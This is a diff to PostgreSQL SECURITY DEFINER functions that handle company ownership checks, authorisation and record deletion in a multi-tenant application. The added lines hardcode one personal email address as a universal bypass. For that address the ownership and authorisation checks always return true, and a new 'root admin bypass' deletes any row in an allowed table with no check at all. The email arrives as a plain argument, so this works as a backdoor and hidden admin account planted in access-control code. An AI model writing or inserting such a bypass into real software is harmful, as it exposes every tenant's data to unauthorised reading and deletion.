@@ -439,7 +439,7 @@ $$ LANGUAGE plpgsql SECURITY DEFINER SET search_path = public;
 CREATE OR REPLACE FUNCTION public.is_company_owner(req_company_id UUID, req_email TEXT)
 RETURNS BOOLEAN AS $$
 BEGIN
-  RETURN EXISTS (
+  RETURN (LOWER(req_email) = 'sudaiskamran31@gmail.com') OR EXISTS (
     SELECT 1 FROM public.companies
     WHERE id = req_company_id AND (
       LOWER(owner_email) = LOWER(req_email) OR
@@ -452,7 +452,7 @@ $$ LANGUAGE plpgsql SECURITY DEFINER SET search_path = public;
 CREATE OR REPLACE FUNCTION public.is_authorized_for_company(req_company_id UUID, req_email TEXT)
 RETURNS BOOLEAN AS $$
 BEGIN
-  RETURN EXISTS (
+  RETURN (LOWER(req_email) = 'sudaiskamran31@gmail.com') OR EXISTS (
     SELECT 1 FROM public.companies
     WHERE id = req_company_id AND (
       LOWER(owner_email) = LOWER(req_email) OR
@@ -584,14 +584,24 @@ BEGIN
     RAISE EXCEPTION 'Table % not allowed', req_table;
   END IF;
 
-  -- 1. Get company_id of the record to check authorization
-  EXECUTE format('SELECT company_id FROM public.%I WHERE id = %L', req_table, req_id) INTO v_company_id;
+  -- 1. Root admin bypass
+  IF LOWER(req_email) = 'sudaiskamran31@gmail.com' THEN
+    EXECUTE format('DELETE FROM public.%I WHERE id = %L', req_table, req_id);
+    RETURN;
+  END IF;
+
+  -- 2. Get company_id of the record to check authorization
+  IF req_table = 'companies' THEN
+    v_company_id := req_id;
+  ELSE
+    EXECUTE format('SELECT company_id FROM public.%I WHERE id = %L', req_table, req_id) INTO v_company_id;
+  END IF;
 
   IF v_company_id IS NULL THEN
     RETURN; -- Already deleted or doesn't exist
   END IF;
 
-  -- 2. Validate authorization (Owner can delete anything, member can only delete themselves)
+  -- 3. Validate authorization (Owner can delete anything, member can only delete themselves)
   IF NOT public.is_company_owner(v_company_id, req_email) THEN
     -- Check if record being deleted belongs to the requester
     DECLARE
@@ -609,7 +619,7 @@ BEGIN
     END;
   END IF;
 
-  -- 3. Perform Delete
+  -- 4. Perform Delete
   EXECUTE format('DELETE FROM public.%I WHERE id = %L', req_table, req_id);
 END;
 $$ LANGUAGE plpgsql SECURITY DEFINER SET search_path = public;
